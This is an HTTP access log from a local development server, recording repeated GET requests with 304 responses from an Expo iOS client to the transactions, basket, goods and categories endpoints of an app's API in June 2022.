::1 - - [29/Jun/2022:09:37:16 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:37:17 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:37:24 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:37:27 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:37:29 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:39:03 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:40:08 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:41:05 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:41:06 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:41:06 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:41:07 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:41:07 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:41:07 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:41:36 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:41:36 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:41:36 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:41:37 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:41:37 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:41:37 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:41:47 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:45:27 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:45:27 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:45:27 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:45:34 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:45:34 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:45:34 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:48:41 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:48:41 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:48:41 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:48:42 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:48:42 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:48:42 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
